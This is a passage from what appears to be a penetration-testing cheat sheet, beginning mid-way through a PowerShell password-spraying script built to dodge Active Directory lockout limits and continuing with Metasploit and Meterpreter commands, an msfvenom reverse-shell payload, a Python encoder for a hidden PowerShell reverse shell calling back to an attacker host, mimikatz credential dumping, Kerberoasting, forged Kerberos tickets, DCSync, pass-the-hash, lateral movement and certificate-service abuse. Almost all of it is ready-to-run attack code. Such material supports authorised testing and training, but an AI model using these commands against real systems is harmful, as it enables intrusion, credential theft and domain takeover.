   Write-Verbose "Found $(($userObj).count) active & unlocked users..."
   
   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects
        
        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]
                    
                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes
                        
                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
	
	
	
				   # Try the auth with current password
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }
			 
			 
			    
                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()   
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```

##### Usage

```c
.\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```

### Exploitation Tools

#### Metasploit

```c
$ sudo msfdb run                   // start database
$ sudo msfdb init                  // database initialization
$ msfdb --use-defaults delete      // delete existing databases
$ msfdb --use-defaults init        // database initialization
$ msfdb status                     // database status
msf6 > workspace                   // metasploit workspaces
msf6 > workspace -a <WORKSPACE>    // add a workspace
msf6 > workspace -r <WORKSPACE>    // rename a workspace
msf6 > workspace -d <WORKSPACE>    // delete a workspace
msf6 > workspace -D                // delete all workspaces
msf6 > db_nmap <OPTIONS>           // execute nmap and add output to database
msf6 > hosts                       // reads hosts from database
msf6 > services                    // reads services from database
msf6 > vulns                       // displaying vulnerabilities
msf6 > search                      // search within metasploit
msf6 > set RHOST <RHOST>           // set remote host
msf6 > set RPORT <RPORT>           // set remote port
msf6 > run                         // run exploit
msf6 > spool /PATH/TO/FILE         // recording screen output
msf6 > save                        // saves current state
msf6 > exploit                     // using module exploit
msf6 > payload                     // using module payload
msf6 > auxiliary                   // using module auxiliary
msf6 > encoder                     // using module encoder
msf6 > nop                         // using module nop
msf6 > show sessions               // displays all current sessions
msf6 > sessions -i 1               // switch to session 1
msf6 > sessions -u <ID>            // upgrading shell to meterpreter
msf6 > sessions -k <ID>            // kill specific session
msf6 > sessions -K                 // kill all sessions
msf6 > jobs                        // showing all current jobs
msf6 > show payloads               // displaying available payloads
msf6 > set VERBOSE true            // enable verbose output
msf6 > set forceexploit true       // exploits the target anyways
msf6 > set EXITFUNC thread         // reverse shell can exit without exit the program
msf6 > set AutoLoadStdapi false    // disables autoload of stdapi
msf6 > set PrependMigrate true     // enables automatic process migration
msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > loadstdapi                         // load stdapi
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > shell                              // get a system shell
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > search -f <FILE>                   // search for a file
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load powershell                    // loads powershell
meterpreter > powershell_shell                   // follow-up command for load powershell
meterpreter > powershell_execute                 // execute command
meterpreter > powershell_import                  // import module
meterpreter > powershell_shell                   // shell
meterpreter > powershell_session_remove          // remove
meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                                // network discovery
meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter > load kiwi                          // load mimikatz
meterpreter > help kiwi                          // mimikatz help
meterpreter > kiwi_cmd                           // execute mimikatz native command
meterpreter > lsa_dump_sam                       // lsa sam dump
meterpreter > dcsync_ntlm krbtgt                 // dc sync
meterpreter > creds_all                          // dump all credentials
meterpreter > creds_msv                          // msv dump
meterpreter > creds_kerberos                     // kerberos dump
meterpreter > creds_ssp                          // ssp dump
meterpreter > creds_wdigest                      // wdigest dump
meterpreter > getprivs                           // get privileges after loading mimikatz
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```

##### Metasploit through Proxychains

```c
proxychains -q msfconsole
```

##### Auxiliary Output Directory

```c
/home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```

##### Meterpreter Listener

###### Generate Payload

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```

###### Setup Listener for Microsoft Windows

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

###### Download Files

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
```

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

```c
.\<FILE>.exe
```

```c
meterpreter > download *
```

### Post Exploitation

#### Account Operators Group Membership

##### Add User

```c
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
```

##### Import PowerView

```c
powershell -ep bypass
. .\PowerView.ps1
```

##### Add DCSync Rights

```c
$pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync
```

##### DCSync

```c
impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
```

#### Active Directory

##### Manual Enumeration

```c
net user /domain
net user <USERNAME> /domain
net group /domain
net group "<GROUP>" /domain
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Find-LocalAdminAccess
Get-NetSession -ComputerName <RHOST>
Get-NetSession -ComputerName <RHOST> -Verbose
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

##### Enumeration using PowerView

```c
powershell -ep bypass
. .\PowerUp.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "<GROUP>" | select member
Convert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104
```

##### Service Principal Name (SPN) Enumeration

```c
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe <RHOST>
```

##### Object Permission Enumeration

| Permission | Description |
| --- | --- |
| GenericAll | Full permissions on object |
| GenericWrite | Edit certain attributes on the object |
| WriteOwner | Change ownership of the object |
| WriteDACL | Edit ACE's applied to object |
| AllExtendedRights | Change password, reset password, etc. |
| ForceChangePassword | Password change for object |
| Self (Self-Membership) | Add ourselves to for example a group |

```c
Get-ObjectAcl -Identity <USERNAME>
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Get-NetGroup "<GROUP>" | select member
net group "<GROUP>" <USERNAME> /add /domain
net group "<GROUP>" <USERNAME> /del /domain
```

##### Share Enumeration

```c
Find-DomainShare
ls \\<RHOST>\sysvol\<DOMAIN>\
ls \\<RHOST>\sysvol\<DOMAIN>\Policies\
cat \\<RHOST>\sysvol\<DOMAIN>\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vgepPfsN1zMFTiQuyApgR92JE"
```

##### Credential Harvesting

###### Cached Credentials

```c
.\mimikatz.exe
mimikatz # sekurlsa::logonpasswords
dir \\<RHOST>\<SHARE>
mimikatz # sekurlsa::tickets
```

###### AS-REP Roasting

```c
impacket-GetNPUsers -dc-ip <RHOST> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```c
.\Rubeus.exe asreproast /nowrap
hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

###### Kerberoasting

```c
impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```c
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

###### Silver Tickets

###### Prerequisites

- SPN password hash
- Domain SID
- Target SPN

###### Silver Ticket Forgery

```c
iwr -UseDefaultCredentials http://<RHOST>
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    // NTLM: 4d28cf5252d39971419580a51484ca09
whoami /user                   // SID: S-1-5-21-1987370270-658905905-1781884369-1105 (S-1-5-21-1987370270-658905905-1781884369)
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:<USERNAME>
klist
iwr -UseDefaultCredentials http://<RHOST>
```

###### Domain Controller Syncronization (DCSync)

###### Prerequisites

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered

###### Domain Controller Synchonization Execution

```c
PS C:\> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
hashcat -m 1000 <FILE> /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```c
impacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>
```

##### Lateral Movement

###### Windows Management Instrumentation (WMI)

###### Spawning Process

```c
wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
```

###### Store Credentials

```c
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

###### Instanciate Distributed Component Object MOdel (DCOM)

```c
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
$command = 'cmd';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

###### Creating Payload

###### revshell_encoder.py

```c
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

###### Payload Encoding

```c
python3 encode.py
```

```c
powershell -nop -w hidden -e JAB<--- SNIP --->CkA
```

###### Execution

```c
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e JAB<--- SNIP --->CkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

###### Windows Remote Shell (WinRS)

###### Prerequisites

- User needs to be part of the Administrators or Remote Management Users group on the target host

###### Execution

```c
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
```

###### PowerShell

```c
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <RHOST> -Credential $credential
Enter-PSSession 1
```

###### PsExec

```c
.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```

###### Pass the Hash (PtH)

```c
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
```

###### Overpass the Hash

```c
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
klist
dir \\<RHOST>\<SHARE>
klist
.\PsExec.exe \\<RHOST> cmd
```

###### Pass the Ticket

###### Prerequisites

- Export an already existing ticket of a user

###### Exporting the Ticket

```c
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz #sekurlsa::tickets /export
dir *.kirbi
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-<USERNAME>@cifs-<RHOST>.kirbi
klist
.\PsExec.exe \\<RHOST> cmd
```

###### Distributed Component Object Model (DCOM)

###### Prerequisites

- Elevated PowerShell session

###### Creating and storing the Distributed Component Object Model

```c
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<RHOST>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c cmd","7")
tasklist | findstr "cmd"
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB<--- SNIP --->CkA","7")
```

##### Active Directory Persistence

###### Golden Tickets

###### Prerequisites

- Hash of krbtgt

###### Forge and Inject Golden Ticket

```c
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd
```

###### Execution

Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.

```c
.\PsExec.exe \\<RHOST> cmd
```

###### Volume Shadow Service (VSS) aka Shadow Copies

> https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/

###### Create and collect necessary Files

```c
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

#### Active Directory Certificate Services (AD CS)

```c
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
```

##### ESC1: Misconfigured Certificate Templates

```c
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC2: Misconfigured Certificate Templates

```c
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC3: Enrollment Agent Templates

```c
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC4: Vulnerable Certificate Template Access Control

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

```c
certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC7: Vulnerable Certificate Authority Access Control

```c
certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
certipy ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### ESC8: NTLM Relay to AD CS HTTP Endpoints

```c
certipy relay -target 'http://<CA>'
certipy relay -ca '<CA>' -template <TEMPLATE>
python3 PetitPotam.py <RHOST> <DOMAIN>
certipy auth -pfx dc.pfx -dc-ip <RHOST>
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

###### Coercing

```c
impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
python3 PetitPotam.py <RHOST> <DOMAIN>
python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

##### ESC9: No Security Extensions

```c
certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
certipy req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

##### ESC10: Weak Certificate Mappings

###### Case 1

```c
certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

###### Case 2

```c
certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
certipy req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
```

##### ESC11: IF_ENFORCEENCRYPTICERTREQUEST

```c
certipy relay -target 'rpc://<CA>' -ca 'CA'
certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

#### ADCSTemplate

```c
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
```

#### ADMiner

```c
AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
```

#### BloodHound

```c
sudo apt-get install openjdk-11-jdk
pip install bloodhound
sudo apt-get install neo4j
sudo apt-get install bloodhound
```

##### Installing and starting Database

```c
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
systemctl start neo4j
./bloodhound --no-sandbox
```

>  http://localhost:7474/browser/

###### Docker Container

```c
docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
```

##### Database Password Reset

>  http://localhost:7474/browser/

```c
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```

#### BloodHound Python

```c
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns <RHOST> -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
```

#### bloodyAD

> https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

```c
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                       // Get all users of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                   // Get all computers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                  // Get all containers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                              // Get AD DNS records
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                           // Get group members
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version        // Get AD functional level
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                 // Get minimum password length policy
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                        // Get UserAccountControl flags
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<OBJECT>$' --attr ms-Mcs-AdmPwd                              // Read LAPS password
